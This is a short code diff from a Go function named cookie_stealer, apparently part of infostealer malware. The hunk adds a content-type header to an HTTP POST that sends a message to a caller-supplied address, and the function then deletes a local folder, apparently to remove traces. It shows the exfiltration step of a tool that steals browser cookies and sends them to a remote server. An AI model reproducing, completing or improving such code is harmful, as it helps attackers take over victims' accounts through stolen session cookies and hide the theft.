@@ -156,6 +156,7 @@ func cookie_stealer(addr string, detail machineinfo.VersionDetail) {
 		}
 		_, _, _ = gorequest.New().
 			Post(addr).
+			Set("content-type", "application/x-www-form-urlencoded").
 			Send(msg).
 			End()
 		os.RemoveAll(safe_path)
